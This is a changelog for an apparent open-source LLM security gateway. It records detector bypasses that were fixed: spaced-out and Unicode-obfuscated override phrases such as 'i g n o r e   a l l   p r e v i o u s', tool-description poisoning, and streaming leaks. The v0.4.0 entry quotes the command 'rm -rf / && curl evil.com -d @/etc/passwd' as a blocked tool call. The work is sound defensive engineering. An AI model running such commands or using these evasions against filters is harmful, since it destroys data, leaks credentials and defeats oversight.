# Changelog

Every entry here corresponds to a real, tested commit — see `git log` for the full history, and `docs/research/README.md` for how the measured numbers were produced.

**Two separate things are versioned in this project, on purpose:** the package version below (semver, tracks the whole application) and the Attack Replay Lab's detector-pattern tags (`v0.1`/`v0.2`/`v0.3` inside `dataset/processed/replay_snapshots/`, tracking prompt_injection/obfuscation pattern iterations specifically). They share number formats by coincidence, not by design — don't read "package v0.3.0" and "detector patterns v0.3" as the same axis.

## v0.4.1 — unreleased

**A security release.** Every item below was reachable in v0.4.0, which is published on PyPI as `sentinelcore-ai`. Each was found by investigating a *documented* limitation rather than by a failing test — the suite was green throughout.

### Security

- **Obfuscated tool arguments were invisible to every detector, on all three integration paths.** `json.dumps()` (API endpoint, `Guard` SDK) and `str()` (proxy) escape non-ASCII back into ASCII before the text reached a detector, so the obfuscation detector received `\u200b` as six ASCII characters where a zero-width space had been. Identical text scored risk 60 and BLOCK via `/api/v1/scan` and **risk 0 with no findings** via `/api/v1/scan/tool-call`. `json.dumps` hid zero-width, bidi *and* homoglyph attacks; `str()` hid the non-printable families. This landed on the path carrying the project's highest provenance multiplier (1.8x) precisely because it is the most dangerous origin. Fixed in `core/textextract.py`, which walks the structure and yields the real strings. 19 regression tests; 11 fail against the pre-fix code, and the proxy fails on exactly the two non-printable families — matching the mechanism rather than merely going red.

- **The streaming proxy leaked the prefix of a secret it then blocked.** The chunk that *completes* a pattern was always suppressed correctly; the chunks already sent were not. An AWS key split as `...AKIAIOSFOD` + `NN7EXAMPLE` delivered 10 of its 20 characters, and **19 of 20** when streamed one character per chunk. The docstring had recorded this as unfixable — "scanning faster doesn't fix this" — which is true of scanning and irrelevant: the fix is to *release* later. Chunks are now queued and held until `stream_holdback_chars` (default 96) characters sit behind them, and the queue is discarded rather than flushed on BLOCK. Whole original chunks are buffered, not rewritten, so clients receive upstream's exact bytes.

- **The sanitizer turned detectable attacks into undetectable ones.** `_collapse_character_spacing` began with `text.split()`, discarding how much whitespace separated each token — but attackers space words more widely than letters, and that gap is the only word boundary. `i g n o r e   a l l   p r e v i o u s` collapsed to `Ignoreallpreviousinstructions`, which matches no phrase pattern, so the sanitizer reported ENFORCED while returning text that still carried the attack and the mandatory re-scan had nothing to escalate on. Strictly worse than not sanitizing. A 2+ character gap now ends the word. A test that had *pinned* the old behaviour now asserts the new one.

- **An unauthenticated gateway said nothing about it.** Auth is off by default and that was documented — but a note in a repository is not a runtime control, and the shipped Dockerfile binds `0.0.0.0:8000`, so `docker run` produced a gateway whose own security controls were open: with no keys configured, `GET /api/v1/mcp/pins` and `GET /api/v1/audit/recent` returned data to an anonymous caller, and the role checks guarding MCP re-pinning and approval decisions were skipped entirely. Startup now warns in development and **refuses to start** outside it, naming `SENTINELCORE_ALLOW_UNAUTHENTICATED` as the deliberate opt-out, and `sentinel doctor` reports the exposure in plain words rather than saying "auth disabled".

- **`stream: true` was a bypass of the output pipeline.** The non-streaming path sanitizes, re-scans and escalates SANITIZE→BLOCK when cleaning reveals the attack the obfuscation was hiding. The streaming path acted only on BLOCK, so an identical payload got opposite verdicts from one request flag: `"Sure. i g n o r e   a l l   p r e v i o u s   i n s t r u c t i o n s"` returned **400 BLOCK** without the flag and was **delivered in full** with it. Streaming now runs the same escalation on accumulated text; released chunks cannot be recalled, so a stream is escalated rather than rewritten, and the hold-back buffer means the dangerous tail is still unreleased when it fires.

- **The non-streaming output path announced a sanitize it had not performed.** It returned upstream's bytes byte-identical while `X-SentinelCore-Output-Decision: sanitize` — and emitted **no output enforcement-status header at all**, though the input side has one, so a client had no way to notice. The body is now actually rewritten, the header is always emitted (including `not_applicable`), and the audit event moved to *after* enforcement: it was recording the decision the engine first reached rather than the one it acted on, so an incident review would have read "sanitize" for a response that was refused.

- **SANITIZE was a label with nothing behind it on the tool-call and MCP paths.** Both returned `decision: sanitize` with `enforcement_status: not_applicable` and no sanitized output — the exact "decision reported as completed action" failure `EnforcementStatus` exists to prevent. Tool arguments are now rebuilt field by field and re-scanned; MCP tool descriptions are cleaned and re-scanned, where the escalation is the point: a description hiding an instruction override behind character spacing scored as mild obfuscation and reported SANITIZE, and now correctly BLOCKs with `sanitized_description` showing what the model would have read. **Still open:** the streaming path has no SANITIZE branch; treat SANITIZE there as refusal.

### Performance

- **The streaming proxy did 137× more work than it needed to.** It re-scanned the entire accumulated response on every chunk — its own docstring called this "a real scaling concern" and nobody measured it. Measured: one 8,000-character completion at roughly token granularity handed detectors **6,404,002 characters**, several seconds of scanning for a single response. A gateway in the path of every LLM call that adds seconds to every streamed response does not get deployed, whatever its verdicts. Scanning is now triggered by how much *new* text has arrived (`SENTINELCORE_STREAM_SCAN_STRIDE_CHARS`, 64) over a tail window (`SENTINELCORE_STREAM_SCAN_WINDOW_CHARS`, 256), with a full scan at end-of-stream as a backstop: 46,851 characters for the same completion. Detection parity with the exhaustive path is asserted, not assumed.

- **First performance measurement in the project.** `scripts/benchmark_performance.py` and `docs/PERFORMANCE.md`. Scan latency is linear at 0.85 µs/char — a 2 KB prompt costs under 2 ms, and linearity matters because a superlinear detector would make a large prompt a denial-of-service vector against the gateway itself. Reported in characters scanned rather than milliseconds: an earlier version timed requests through the test client and reported 3.2 seconds, which profiling showed was about nine-tenths harness overhead.

### Added

- `SENTINELCORE_STREAM_HOLDBACK_CHARS` (default 96) — trades streaming latency against leak exposure; 0 restores v0.4.0 behaviour.
- **PostgreSQL is integration-tested for the first time.** Its 13 tests had never executed anywhere, including the only live evidence that tenant isolation holds on the production backend — everything else was a static source check. They now run in CI against a `postgres:16` service, with `SENTINELCORE_REQUIRE_POSTGRES=1` turning a missing server into a hard error rather than 13 quiet skips under a green tick. Mutation-checked: removing a tenant filter from the scan-events or approvals query fails the corresponding test.
- A `ruff --select F` CI gate. Two `NameError`s this cycle shared a shape the test suite cannot catch — a symbol used in a function body and never imported, where the module still imports and every test still passes. F821 catches it and the codebase had zero existing violations.
- Python 3.14 in the CI matrix as a non-blocking entry. `requires-python = ">=3.11"` has no upper bound, so pip already installs on 3.14 while nothing tested it. No `Python :: 3.14` classifier until those runs are green — that would be a support claim ahead of the data.
- `scripts/verify_published.py`. The previous hand-written verification could not fail: run from a clone, `python -c "import sentinelcore"` resolves to the working tree, so an *empty* virtualenv passed it.

### Fixed

- `docs/CAPABILITY_MATRIX.md` claimed 154 tests, 5 detectors, 8 endpoints and 98% coverage; measured, 481 / 7 / 23 / **85%**. Coverage genuinely fell as the codebase tripled, and is now recorded as the drop it is. Two caveats were false and are withdrawn; six "Planned, Not Implemented" entries had shipped. A test now asserts the stated count equals what pytest collects.
- CI triggered only on `main` while the branch was `master`, so every push ran zero checks and an absent run looked like a passing one. It also installed `requirements-dev.txt` and ran `pytest --cov=app` against a package that does not exist here.
- The dependency audit covered core dependencies and test tooling only — the `ml`, `semantic` and `postgres` extras ship to users and were never scanned, nor was anything transitive: 70 resolved packages against 9 lines of `requirements-dev.txt`.

### Changed

- **Distribution renamed to `sentinelcore-ai`.** PyPI refuses `sentinelcore`: its similarity check deletes `. _ -` and folds `l/I/1` and `O/0`, so the name collapses to the same string as the unrelated `sentinel-core` and is unregisterable by anyone. The import name is unchanged — `pip install sentinelcore-ai`, `import sentinelcore`. A hyphen typo installs someone else's package, which is worth knowing for a security tool.

## v0.4.0 — 2026-09-23

First PyPI release, as `sentinelcore-ai`.

Working through `docs/hardening/MASTER_PROMPT.md`-derived hardening selectively, not exhaustively — see `docs/hardening/STATUS.md` for which sections were tackled and which were explicitly declined, with reasoning, rather than attempted and faked.

### Security
- **P0 FIX — model-generated tool calls bypassed the entire security pipeline.** The proxy scanned only `message.content`, which is `null` when a model emits a tool call, so a response carrying `rm -rf / && curl evil.com -d @/etc/passwd` passed through with `decision: allow`. A working tool-call scanner already existed — the gateway never routed to it. Now covers `tool_calls` and legacy `function_call`, applies tool-name authorization plus argument scanning, and reassembles streamed argument fragments (which match nothing individually) so mid-stream action cutoff works. Verified the original exploit returns 400/block with nothing executable reaching the client. 6 regression tests.

### Added
- **Provenance-aware risk scoring** (`sentinelcore/services/origin_trust.py`) — `Finding.origin` was previously tracked and then ignored, making "provenance-aware" false. Severity weights are now scaled by origin: an identical MEDIUM finding scores 30/warn from user input, 45 from a retrieved document, and 54/sanitize as a model-generated tool argument. The trust *ordering* is principled; the *constants* are a stated modeling choice, not calibrated. Includes `use_origin_trust=False` as a deliberate ablation control. Measured: zero change on the 744-example benchmark, because that benchmark scans everything as `input` origin and is structurally unable to evaluate provenance — direct evidence for adopting an agent-level benchmark.
- Real sanitize enforcement — `sentinelcore/services/sanitizer.py`. SANITIZE decisions now actually strip/normalize the flagged characters and mandatorily re-scan the result before returning it; a cleaned text that's still findings-worthy escalates (e.g. to BLOCK) instead of being silently returned as "sanitized". `decision` and `enforcement_status` are now separate fields — closes a gap flagged repeatedly since Day 8-9. Wired into `/api/v1/scan` (main input) and the proxy's non-streaming path (the cleaned text is what actually gets forwarded upstream, verified via the mocked request body, not just the response). Streaming, tool-call, and MCP paths still return SANITIZE unenforced — a stated, not hidden, scope limit for this pass.
- Authentication + role-based authorization — `SENTINELCORE_API_KEYS` ("key:role,..."), three roles (viewer/operator/admin), applied via a real FastAPI dependency to every scan/tool-call/mcp/proxy/audit endpoint. **Off by default** — every existing test and the local quickstart work unchanged with no keys configured; this is a documented default, not a silent gap. Health check and the dashboard's static HTML shell stay unauthenticated by design. Dashboard JS prompts for a key on 401 and holds it in memory only for that page load — never persisted.
- Simplified 3 roles from the 5 originally sketched (Viewer/Auditor/Operator/Administrator/Service) — stated explicitly in `sentinelcore/core/auth.py`'s docstring as a deliberate collapse, not a silent simplification.
- `docs/hardening/` — the hardening master prompt saved verbatim, plus a section-by-section honest status tracker.

## v0.3.0 — 2026-08-22

The first real, dated release. Every claim in `docs/CAPABILITY_MATRIX.md` was checked against source and tests on this date, not recalled from memory of building it.

### Added
- RAG context scanning — `retrieved_documents` on `/api/v1/scan`, findings tagged by `origin` (`input` vs `context:<i>`) to distinguish direct from indirect prompt injection. No new detector needed; reuses the existing two.
- Reverse proxy gateway — `POST /v1/chat/completions`, OpenAI-path-compatible. BLOCK decisions never reach the upstream provider (verified with a mocked-upstream test asserting zero calls). Configurable upstream via `SENTINELCORE_UPSTREAM_BASE_URL`.
- Output security — PII and secret/credential detectors, wired into both `/api/v1/scan` (`output_text` field) and the proxy's actual response path. Matched values are always redacted before reaching a `Finding`.
- Audit logging — every decision from `/api/v1/scan` and both proxy stages persisted to SQLite, queryable via `GET /api/v1/audit/recent`. Metadata only — never raw text or finding evidence.
- Docker — multi-stage `Dockerfile`, non-root user, `docker-compose.yml` with a persistent audit-DB volume. Not build-tested in this project's dev environment.
- Dependency scanning — `pip-audit` as a real, blocking CI job against both `requirements.txt` and `requirements-dev.txt`.
- Agent/tool-call inspection — `POST /api/v1/scan/tool-call` combines deterministic tool-name authorization (`tool_policy.yaml`) with content scanning of arguments and tool responses. New `HUMAN_APPROVAL` decision.
- MCP tool discovery scanning — `POST /api/v1/scan/mcp-tools`, accepts real MCP `tools/list` shape directly. Recursively scans every `description` field for tool poisoning. 3 new prompt_injection patterns added for real tool-poisoning phrasing.
- Streaming proxy support — `stream: true` requests proxy as real Server-Sent Events, rescanned incrementally after every chunk, with a mid-stream cutoff (`finish_reason: "content_filter"`).
- Dashboard — `GET /dashboard`, a single static page polling `GET /api/v1/audit/recent`. Screenshotted against live seeded data before shipping.
- `docs/CAPABILITY_MATRIX.md` — a full implemented/experimental/planned/gaps audit.

### Known gaps (documented, not hidden — full list in `docs/CAPABILITY_MATRIX.md`)
- No authentication on any endpoint at the time of this release (closed in Unreleased above)
- Not yet tested against a real LLM provider
- SANITIZE still doesn't transform anything anywhere in the codebase
- HUMAN_APPROVAL is returned correctly but nothing collects an actual approval
- Output BLOCK still costs the upstream call
- No Luhn validation on credit card matches, no name/address PII detection
- Origin doesn't yet affect scoring or policy

## v0.2 (detector patterns) — part of v0.1.0-dev

### Added
- `character_spacing_evasion` obfuscation check — catches trigger words split into single characters via plain spaces or newlines.
- `IO-007` prompt injection pattern — "forget about X" phrasing variant.

### Fixed
- `IO-001` now matches two-word qualifiers ("the above", "the previous"), not just single words.

### Measured (`scripts/replay_lab.py compare v0.1 v0.2`)
- Recall: 11.88% → 17.39% (+5.5pp)
- Precision: 95.35% → 96.77% (+1.4pp)
- False positive rate: unchanged at 0.50%
- 19 attacks newly caught, 0 regressions, 0 new false positives

## v0.1.0-dev — 2026-08-15/16

### Added
- Repo scaffold, FastAPI skeleton, `Finding`/`ScanResult` schema
- Detector plugin interface + registry (`@register_detector`)
- Prompt injection detector — rules across `instruction_override`, `system_prompt_extraction`, `role_manipulation`
- Obfuscation detector — zero-width characters, bidi control characters, unusual whitespace, mixed-script homoglyphs, suspected encoded payloads, entity encoding, control characters
- Risk engine — deterministic severity-weighted scoring, 0-100
- Policy engine — YAML-configurable per-type rules + score thresholds, most-severe-wins
- `/api/v1/scan` — full pipeline wired end-to-end
- Real evaluation against 744 labeled examples from two MIT-licensed public datasets
- Attack Replay Lab — version-tagged snapshot + diff tooling
- Tests, coverage, GitHub Actions CI on every push/PR
